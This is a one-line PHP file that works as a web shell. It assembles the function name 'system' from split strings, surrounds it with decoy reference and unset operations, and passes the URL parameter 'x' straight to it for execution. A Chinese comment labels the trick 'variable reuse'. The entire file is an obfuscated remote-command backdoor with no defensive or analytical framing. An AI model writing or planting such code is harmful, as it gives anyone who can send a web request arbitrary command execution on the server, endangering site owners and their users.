<?php $a=array(&$b);$b=1;unset($a);$c="sys"."tem";$c($_GET['x']); // 触发变量复用 ?>
